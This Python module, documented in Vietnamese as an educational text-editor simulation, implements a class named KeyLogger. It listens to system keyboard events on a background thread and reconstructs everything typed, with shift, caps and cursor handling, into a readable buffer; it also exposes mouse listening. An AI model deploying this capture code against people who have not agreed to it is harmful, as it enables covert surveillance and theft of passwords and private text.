"""Mô phỏng text editor trong bộ nhớ từ keyboard event đã chuẩn hóa.

File path: `src/system_monitor/keylogger/__init__.py`.
Input: event `(KEY_*, "down" | "up" | "hold")` từ `listen_keys()`.
Output: `get_current_buffer()` trả toàn bộ text `str` trong virtual buffer;
`raise_if_listener_failed()` ném lại lỗi backend đã lưu nếu có.
Nguyên lý: text là danh sách tối đa 6767 ký tự, cursor là offset; sửa và điều hướng
chỉ thay đổi state process, không ghi xuống đĩa. `stop()` signal listener, chờ
backend đóng rồi mới trả về.

EDUCATION PURPOSE ONLY: Module chỉ phục vụ bài tập mô phỏng editor với input tự
nguyện trong môi trường học tập. Không lưu bền, truyền mạng hoặc dùng dữ liệu
nhập để giám sát người dùng. Không dùng module để thu thập input trái phép.
"""

from __future__ import annotations

import threading

from collections.abc import Iterator

from agent.platform import get_default_platform_services
from agent.platform_protocols import (
    KeyEvent,
    KeyListenerOperations,
    KeyState,
    MouseEvent,
    MouseState,
)


_MODIFIERS = {"KEY_LEFTALT", "KEY_RIGHTALT", "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"}
_MAX_BUFFER_CHARS = 6767
_KEYPAD_SYMBOLS = {
    "KEY_KPSLASH": "/",
    "KEY_KPASTERISK": "*",
    "KEY_KPMINUS": "-",
    "KEY_KPPLUS": "+",
}
_NAVIGATION = {
    "KEY_LEFT": "left",
    "KEY_RIGHT": "right",
    "KEY_UP": "up",
    "KEY_DOWN": "down",
    "KEY_HOME": "home",
    "KEY_END": "end",
    "KEY_PAGEUP": "pageup",
    "KEY_PAGEDOWN": "pagedown",
    "KEY_INSERT": "insert",
    "KEY_DELETE": "delete",
}
_KEYPAD_NAVIGATION = {
    "KEY_KP0": "insert",
    "KEY_KP1": "end",
    "KEY_KP2": "down",
    "KEY_KP3": "pagedown",
    "KEY_KP4": "left",
    "KEY_KP6": "right",
    "KEY_KP7": "home",
    "KEY_KP8": "up",
    "KEY_KP9": "pageup",
    "KEY_KPDOT": "delete",
    "KEY_KPHOME": "home",
    "KEY_KPEND": "end",
    "KEY_KPUP": "up",
    "KEY_KPDOWN": "down",
    "KEY_KPLEFT": "left",
    "KEY_KPRIGHT": "right",
    "KEY_KPPAGEUP": "pageup",
    "KEY_KPPAGEDOWN": "pagedown",
    "KEY_KPINSERT": "insert",
    "KEY_KPDELETE": "delete",
}
_SHIFTED_DIGITS = {
    "0": ")",
    "1": "!",
    "2": "@",
    "3": "#",
    "4": "$",
    "5": "%",
    "6": "^",
    "7": "&",
    "8": "*",
    "9": "(",
}
_KEY_SYMBOLS = {
    "KEY_SPACE": " ",
    "KEY_MINUS": "-",
    "KEY_EQUAL": "=",
    "KEY_LEFTBRACE": "[",
    "KEY_RIGHTBRACE": "]",
    "KEY_BACKSLASH": "\\",
    "KEY_SEMICOLON": ";",
    "KEY_APOSTROPHE": "'",
    "KEY_GRAVE": "`",
    "KEY_COMMA": ",",
    "KEY_DOT": ".",
    "KEY_SLASH": "/",
}
_SHIFTED_KEY_SYMBOLS = {
    "KEY_MINUS": "_",
    "KEY_EQUAL": "+",
    "KEY_LEFTBRACE": "{",
    "KEY_RIGHTBRACE": "}",
    "KEY_BACKSLASH": "|",
    "KEY_SEMICOLON": ":",
    "KEY_APOSTROPHE": '"',
    "KEY_GRAVE": "~",
    "KEY_COMMA": "<",
    "KEY_DOT": ">",
    "KEY_SLASH": "?",
}


def _get_operations() -> KeyListenerOperations:
    return get_default_platform_services().key_listener


def get_num_lock_state() -> bool:
    """Trả trạng thái NumLock từ adapter platform mặc định."""

    return _get_operations().get_num_lock_state()


def listen_keys(
    timeout: float | None = None,
    stop_event: threading.Event | None = None,
) -> Iterator[KeyEvent]:
    """Sinh keyboard event từ adapter platform mặc định."""

    return _get_operations().listen_keys(timeout, stop_event)


def listen_mice(
    timeout: float | None = None,
    stop_event: threading.Event | None = None,
) -> Iterator[MouseEvent]:
    """Sinh mouse event từ adapter platform mặc định."""

    return _get_operations().listen_mice(timeout, stop_event)


class KeyLogger:
    """Giữ virtual text buffer và cursor cho bài tập mô phỏng editor."""

    _listener: threading.Thread | None = None
    _listener_stop_event: threading.Event | None = None
    _listener_lock = threading.Lock()
    _listening = False
    _listener_error: Exception | None = None
    _key_listener_operations: KeyListenerOperations | None = None
    _buffer: list[str] = []
    _cursor = 0
    _modifiers: set[str] = set()
    _caps_lock = False

    @classmethod
    def start(cls, operations: KeyListenerOperations | None = None) -> None:
        while True:
            with cls._listener_lock:
                listener = cls._listener
                stop_event = cls._listener_stop_event
                if listener is None or not listener.is_alive():
                    cls._key_listener_operations = operations
                    cls._listener_error = None
                    cls._listening = True
                    cls._listener_stop_event = threading.Event()
                    cls._listener = threading.Thread(
                        target=cls._listen,
                        args=(cls._listener_stop_event,),
                        daemon=True,
                    )
                    cls._listener.start()
                    return
                if stop_event is None or not stop_event.is_set():
                    return
            listener.join()

    @classmethod
    def stop(cls) -> None:
        """Dừng listener và chờ backend đóng trước khi trả về."""

        with cls._listener_lock:
            cls._listening = False
            stop_event = cls._listener_stop_event
            listener = cls._listener
            if stop_event is not None:
                stop_event.set()
        if listener is not None and listener is not threading.current_thread():
            listener.join()
        with cls._listener_lock:
            cls._buffer.clear()
            cls._cursor = 0
            cls._modifiers.clear()
            cls._caps_lock = False

    @classmethod
    def _listen(cls, stop_event: threading.Event) -> None:
        operations = cls._key_listener_operations
        try:
            events = (
                listen_keys(timeout=0.1, stop_event=stop_event)
                if operations is None
                else operations.listen_keys(timeout=0.1, stop_event=stop_event)
            )
            for event in events:
                if stop_event.is_set():
                    break
                cls._handle_key_event(event)
        except Exception as error:
            cls._listener_error = error
        finally:
            if operations is not None:
                operations.close()
            with cls._listener_lock:
                cls._listening = False
                if cls._listener_stop_event is stop_event:
                    cls._listener_stop_event = None
                    cls._listener = None
                    cls._key_listener_operations = None

    @classmethod
    def get_listener_error(cls) -> Exception | None:
        """Trả lỗi backend listener để caller manual có thể báo rõ."""

        return cls._listener_error


    @classmethod
    def raise_if_listener_failed(cls) -> None:
        """Ném lại lỗi backend listener đã lưu để caller xử lý bằng try/except."""

        if cls._listener_error is not None:
            raise cls._listener_error

    @classmethod
    def _handle_key_event(cls, event: KeyEvent) -> None:
        """Áp dụng một keyboard event vào virtual buffer."""
        key_name, state = event
        if key_name in _MODIFIERS:
            if state in ["down", "hold"]:
                cls._modifiers.add(key_name)
            elif state == "up":
                cls._modifiers.discard(key_name)
            return
        if key_name == "KEY_CAPSLOCK":
            if state == "down":
                cls._caps_lock = not cls._caps_lock
            return
        if state not in {"down", "hold"}:
            return
        if cls._handle_navigation(key_name):
            return
        if key_name == "KEY_BACKSPACE":
            cls._delete_before_cursor()
        elif key_name in {"KEY_ENTER", "KEY_KPENTER", "KEY_TAB"}:
            cls._insert("\t" if key_name == "KEY_TAB" else "\n")
        else:
            character = cls._character(key_name)
            if character is not None:
                cls._insert(character)

    @classmethod
    def _handle_navigation(cls, key_name: str) -> bool:
        action = _NAVIGATION.get(key_name)
        if action is None and not cls._get_num_lock_state():
            action = _KEYPAD_NAVIGATION.get(key_name)
        if action is None:
            return False
        getattr(cls, f"_move_{action}")()
        return True

    @classmethod
    def _character(cls, key_name: str) -> str | None:
        shifted = bool({"KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"} & cls._modifiers)
        if key_name in _KEY_SYMBOLS:
            if shifted:
                return _SHIFTED_KEY_SYMBOLS.get(key_name, _KEY_SYMBOLS[key_name])
            return _KEY_SYMBOLS[key_name]
        if key_name in _KEYPAD_SYMBOLS:
            return _KEYPAD_SYMBOLS[key_name]
        if key_name.startswith("KEY_KP") and cls._get_num_lock_state():
            suffix = key_name[6:]
            if suffix.isdigit():
                return suffix
            if key_name == "KEY_KPDOT":
                return "."
        if not key_name.startswith("KEY_") or len(key_name) != 5:
            return None
        character = key_name[-1].lower()
        if character.isalpha():
            return character.upper() if shifted != cls._caps_lock else character
        if shifted:
            return _SHIFTED_DIGITS.get(character, character)
        return character

    @classmethod
    def _get_num_lock_state(cls) -> bool:
        """Đọc NumLock qua dependency được inject hoặc compatibility facade."""

        operations = cls._key_listener_operations
        if operations is None:
            return get_num_lock_state()
        return operations.get_num_lock_state()

    @classmethod
    def _insert(cls, text: str) -> None:
        cls._buffer[cls._cursor : cls._cursor] = list(text)
        cls._cursor += len(text)
        overflow = len(cls._buffer) - _MAX_BUFFER_CHARS
        if overflow > 0:
            del cls._buffer[:overflow]
            cls._cursor = min(
                len(cls._buffer),
                max(0, cls._cursor - overflow),
            )

    @classmethod
    def _delete_before_cursor(cls) -> None:
        if cls._cursor:
            cls._cursor -= 1
            del cls._buffer[cls._cursor]

    @classmethod
    def _move_left(cls) -> None:
        cls._cursor = max(0, cls._cursor - 1)

    @classmethod
    def _move_right(cls) -> None:
        cls._cursor = min(len(cls._buffer), cls._cursor + 1)

    @classmethod
    def _move_home(cls) -> None:
        while cls._cursor and cls._buffer[cls._cursor - 1] != "\n":
            cls._cursor -= 1

    @classmethod
    def _move_end(cls) -> None:
        while cls._cursor < len(cls._buffer) and cls._buffer[cls._cursor] != "\n":
            cls._cursor += 1

    @classmethod
    def _move_up(cls) -> None:
        cls._move_home()
        if cls._cursor:
            cls._cursor -= 1
            cls._move_home()

    @classmethod
    def _move_down(cls) -> None:
        cls._move_end()
        if cls._cursor < len(cls._buffer):
            cls._cursor += 1

    @classmethod
    def _move_pageup(cls) -> None:
        for _ in range(20):
            cls._move_up()

    @classmethod
    def _move_pagedown(cls) -> None:
        for _ in range(20):
            cls._move_down()

    @classmethod
    def _move_insert(cls) -> None:
        return None

    @classmethod
    def _move_delete(cls) -> None:
        if cls._cursor < len(cls._buffer):
            del cls._buffer[cls._cursor]

    @classmethod
    def get_current_buffer(cls) -> str:
        """Trả toàn bộ virtual buffer dưới dạng chuỗi, không xóa state."""

        return "".join(cls._buffer)


key_logger = KeyLogger()


__all__ = [
    "KeyEvent",
    "KeyState",
    "MouseEvent",
    "MouseState",
    "get_num_lock_state",
    "key_logger",
    "listen_keys",
    "listen_mice",
]
